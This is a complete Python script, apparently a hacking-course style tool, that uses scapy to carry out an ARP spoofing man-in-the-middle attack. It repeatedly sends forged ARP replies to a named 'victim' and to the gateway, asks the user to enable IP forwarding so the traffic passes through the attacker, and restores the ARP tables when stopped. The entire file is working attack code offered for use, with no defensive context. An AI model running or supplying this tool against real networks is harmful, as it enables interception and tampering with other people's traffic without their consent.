#!/usr/bin/env python3

__author__ = "3r4th"

import optparse
import time

import scapy.all as scapy


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway-ip", dest="gateway_ip", help="Router ip address")
    parser.add_option("-v", "--victim-ip", dest="victim_ip", help="Victim ip address")
    (options, arguments) = parser.parse_args()
    if not options.gateway_ip:
        parser.error("[-] Please specify your gateway ip address, use --help for more info")
    elif not options.victim_ip:
        parser.error("[-] Please specify the victim ip address, use --help for more info")
    return options


def get_target_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    if len(answered_list):
        target_mac = answered_list[0][1].hwsrc
        return target_mac
    else:
        print("[-] No host detected for the " + target_ip + " ip address")
        print("[+] Quitting ...")
        exit(0)


def spoof(target_ip, spoof_ip):
    target_mac = get_target_mac(target_ip)
    response_for_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(response_for_target, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    response_for_destination = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,
                                         hwsrc=source_mac)
    scapy.send(response_for_destination, count=4, verbose=False)


if __name__ == "__main__":
    options = get_arguments()
    sent_packets = 0
    try:
        print("[!] Please make sure you have enabled IP forwarding")
        time.sleep(2)
        print("[+] ARP spoofing Started ...")
        while True:
            spoof(options.victim_ip, options.gateway_ip)
            spoof(options.gateway_ip, options.victim_ip)
            sent_packets += 2
            print("\r[+] Number of packets sent: " + str(sent_packets), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C. Resetting ARP tables ...")
        restore(options.victim_ip, options.gateway_ip)
        restore(options.gateway_ip, options.victim_ip)
        print("[+] ARP spoofing Stopped ...")
